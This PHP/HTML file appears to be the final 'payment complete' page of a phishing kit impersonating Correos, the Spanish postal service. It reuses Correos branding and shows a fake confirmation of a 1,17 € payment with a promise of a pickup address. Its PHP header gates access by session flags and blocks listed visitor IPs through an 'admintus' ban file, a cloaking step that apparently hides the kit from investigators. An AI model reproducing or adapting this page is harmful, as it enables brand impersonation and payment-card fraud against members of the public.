<?php
session_start();
require_once './config.php';
require_once './helpers/functions.php';
require_once './helpers/class/UserInfo.php';
require_once './admintus/config/User.php';

if (!isset($_SESSION['page'])) header("location: ./");
if (!isset($_SESSION['allowed'])) header("location: ./");
if (file_exists("./admintus/IPBam.txt")) comprobateIP("./admintus/IPBam.txt", UserInfo::getIP(), $out_url);
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="wf-inactive gr__sc-icpdz_correos_es">
<head id="Head1">
    <style>
        .hidden {
            display: none;
        }
    </style>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <script language="javascript" type="text/javascript" src="Seleccione%20medio%20de%20pago_fichiers/typeKit.js"></script>

    <style type="text/css">
        .tk-pt-sans {
            font-family: "pt-sans", sans-serif;
        }
    </style>
    <style type="text/css">
        @font-face {
            font-family: pt-sans;
            src: url(https://use.typekit.net/af/802da8/0000000000000000000124f9/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("woff2"), url(https://use.typekit.net/af/802da8/0000000000000000000124f9/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("woff"), url(https://use.typekit.net/af/802da8/0000000000000000000124f9/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("opentype");
            font-weight: 400;
            font-style: normal;
        }

        @font-face {
            font-family: pt-sans;
            src: url(https://use.typekit.net/af/7505b0/0000000000000000000124fa/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("woff2"), url(https://use.typekit.net/af/7505b0/0000000000000000000124fa/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("woff"), url(https://use.typekit.net/af/7505b0/0000000000000000000124fa/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("opentype");
            font-weight: 700;
            font-style: normal;
        }
    </style>
    <link rel="stylesheet" type="text/css" href="Seleccione%20medio%20de%20pago_fichiers/bootstrap.css" media="screen">
    <link rel="stylesheet" type="text/css" href="Seleccione%20medio%20de%20pago_fichiers/main.css">
    <title>
        Seleccione medio de pago
    </title>
    <link id="Link1" rel="shortcut icon" href="https://sc-icpdz.correos.es/ilionx45Front/lib/estilos/ilion/images/correos.ico">
    <link id="Link2" rel="icon" href="https://sc-icpdz.correos.es/ilionx45Front/lib/estilos/ilion/images/correos.ico" type="image/ico">
</head>

<body onload="hideLoading();" class="ogilvy-body" data-gr-c-s-loaded="true" cz-shortcut-listen="true">
    <form name="formInterfaz" method="post" action="Venta.php" id="formInterfaz">
        <div>
        </div>
        <div>
        </div>
        <!-- Load -->
        <div id="showLoading" style="display: none;">
            <div style="position: fixed; text-align: center; height: 100%; width: 100%; top: 0; right: 0; left: 0; z-index: 9999999; background-color: #EAEAEA; opacity: 0.7;">
                <div class="load-container load">
                    <div class="loader">
                        <span id="cargar">CARGANDO..</span>
                    </div>
                </div>
            </div>
        </div>
        <div class="wrapper">
            <section>
                <div id="cabecera" class="container ogilvy-bg-amarillo">
                    <div class="row">
                        <div class="col-xs-12 text-center ogilvy-header">
                            <img src="Seleccione%20medio%20de%20pago_fichiers/ogilvy-logos.png" id="logoCorreos" class="ogilvy-logosuperior" alt="Correos">

                        </div>
                    </div>
                </div>
            </section>
            <div id="panelContent">

                <div class="contenido" id="contenido">
                    <!--ERROR-->
                    <!--TITLES-->
                    <section>
                        <div class="container">
                            <div class="row">
                                <div class="col-xs-12 col-sm-6 col-sm-offset-3 col-lg-5 col-lg-offset-3 text-center ogilvy-espacioseccion">
                                    <div id="DatosExtra" class="ogilvy-subtitular">
                                        <span id="Importe" class="subtitulo" style="font-weight:bold;"></span>
                                        <span id="Importevalor" class="subtitulo"></span>
                                    </div>
                                    <div id="Panel1" class="ogilvy-subtitular">
                                        <div style="margin-left: auto; margin-left: auto; text-align: center;" class="ogilvy-titular">
                                            <div style="margin-left: auto; margin-left: auto; text-align: center;" class="ogilvy-titular">
                                                <span id="fecha" class="descripcionPago" style="font-weight:bold;">FECHA </span><span id="Fechavalor" style="font-weight:normal;"><?php echo date('d/m/Y H:i:s'); ?></span>
                                            </div>
                                            <div style="margin-left: auto; margin-left: auto; text-align: center;display:none;" class="ogilvy-titular">
                                                <span id="concepto" class="descripcionPago" style="font-weight:bold;">CONCEPTO </span><span id="conceptovalor" style="font-weight:normal;">Compra realizada en Correos </span>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="ogilvy-titular" style="display:none;">
                                        <span id="lbTitle" class="titulo">Se seleccionó pagar 1,17 €</span>
                                    </div>
                                    <div id="divSubtitularPago" class="ogilvy-subtitular ogilvy-subtitular-grande">
                                        <span id="lbSubTittle" class="subtitulo">operación completada</span><br>
                                    </div>
                                    <div id="divMetodoPago" class="ogilvy-metodo centerBlock">
                                        <div class="ogilvy-iconomediodepago">
                                            <img id="imgPago" class="ogilvy-imagenpago" src="./assets/img/good-validation-agree-accept-done-success-approved-confirmed-active-verify-checkmark-valid-ok-correct-check-icon.svg" style="border-width:0px;">
                                        </div>
                                        <div class="ogilvy-textomediodepago">
                                            GRACIAS
                                        </div>
                                        <div class="ogilvy-clearfix"></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </section>
                    <div id="updPanel">
                        <!--Loading-->
                        <div id="updateProgress" style="display:none;" role="status" aria-hidden="true">
                            <div style="position: fixed; text-align: center; height: 100%; width: 100%; top: 0; right: 0; left: 0; z-index: 9999999; background-color: #EAEAEA; opacity: 0.7;">
                                <div class="load-container load">
                                    <div class="loader">
                                        <span id="loading">CARGANDO..</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <!--Payments-->
                        <div class="container">
                            <div class="row">
                                <div class="col-xs-12 col-sm-6 col-sm-offset-3 col-lg-5 col-lg-offset-3 ogilvy-seleccionpago ogilvy-espacioseccion">
                                    <div class="col-xs-12">
                                        <div>
                                            <table id="GridViewPagoSimple" style="border-style:None;width:100%;border-collapse:collapse;" cellspacing="0" border="0">
                                                <tbody>
                                                    <tr class="ogilvy-mediodepago ogilvy-mediodepago-selecionado" style="background-color:#14B99A">
                                                        <td style="width:80px;" valign="top" align="right">
                                                            <div class="ogilvy-iconomediodepago" onclick="Javascript:changeMMPP('01757TA', this);">
                                                                <img id="GridViewPagoSimple_ctl02_imgPago" class="ogilvy-imagenpago" src="./assets/img/thank-you-icon.png" style="border-width:0px;">
                                                            </div>
                                                        </td>
                                                        <td style="width:370px;" align="left">
                                                            <div class="div_relleno" onclick="Javascript:changeMMPP('01757TA', this);">
                                                                <span id="GridViewPagoSimple_ctl02_lbDesPagoSimple" class="descripcionPago">Le enviaremos la dirección del punto de recogida en las próximas 24 horas</span>
                                                                <div id="GridViewPagoSimple_ctl02_pRecurrente">
                                                                    <div id="panelRecurrente" class="hidden">
                                                                        <table id="GridViewPagoSimple_ctl02_tbRecurrente" border="0">
                                                                            <tbody>
                                                                                <tr>
                                                                                    <td></td>
                                                                                </tr>
                                                                            </tbody>
                                                                        </table>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </td>
                                                        <td style="width:20px;" align="center">
                                                            <label class="label-relleno" onclick="Javascript:changeMMPP('01757TA', this);" checked="checked" value="01757TA" style="background-color:#14B99A">
                                                                <input type="radio" class="radioButton" id="rdbSelectPayment" name="rdbSelectPayment">
                                                            </label>
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                    </div>
                    <!--Buttons -->
                </div>
            </div>
        </div>
    </form>


</body>
<span class="gr__tooltip"><span class="gr__tooltip-content"></span><i class="gr__tooltip-logo"></i><span class="gr__triangle"></span></span>

</html>